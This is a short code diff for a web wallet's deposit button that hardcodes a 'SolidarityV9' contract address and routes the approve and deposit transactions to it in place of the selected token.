@@ -100,6 +100,7 @@ document.getElementById("depositBtn")?.addEventListener("click", async () => {
 
   try {
     const token = document.getElementById("walletTokenSelect").value;
+    const contractAddr = "0x9cA041d9B75093fc33890Ead7cDfF28284826eCa"; // SolidarityV9 contract
     logToPanel(`[DEBUG] Sending POST to /prodbot/deposit with token=${token}, amount=${weiAmount}`);
 
     const resp = await fetch(`${window.BASE_URL}/prodbot/deposit`, {
@@ -146,16 +147,15 @@ document.getElementById("depositBtn")?.addEventListener("click", async () => {
     logToPanel(`Approve Contract: ${data.approve_contract}`);
     logToPanel(`Deposit Call: ${data.deposit}`);
 
-    // 🔹 Send the transactions in sequence
-    await sendEncodedTx(token, data.approve_charity);
-    await sendEncodedTx(token, data.approve_contract);
-    await sendEncodedTx(token, data.deposit);
+    // 🔹 Send the transactions in sequence to the SolidarityV9 contract
+    await sendEncodedTx(contractAddr, data.approve_charity);
+    await sendEncodedTx(contractAddr, data.approve_contract);
+    await sendEncodedTx(contractAddr, data.deposit);
 
   } catch (err) {
     logToPanel(`[DEPOSIT ERROR] ${err.message}`);
   }
 });
-
 
 
 
